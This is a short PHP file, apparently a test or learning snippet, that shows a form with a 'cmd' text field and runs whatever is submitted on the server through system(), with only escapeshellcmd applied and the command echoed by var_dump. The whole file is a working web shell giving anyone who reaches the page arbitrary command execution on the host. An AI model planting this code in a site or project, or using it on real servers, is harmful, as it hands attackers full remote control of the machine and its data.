<?php 
	if($_SERVER["REQUEST_METHOD"] === "POST") {
		$cmd = escapeshellcmd($_POST["cmd"]);
		var_dump($cmd);
		$comando = system("$cmd", $retorno);
	}
?>
<form method="POST">
	<input type="text" name="cmd">
	<button type="submit">Send</button>
</form>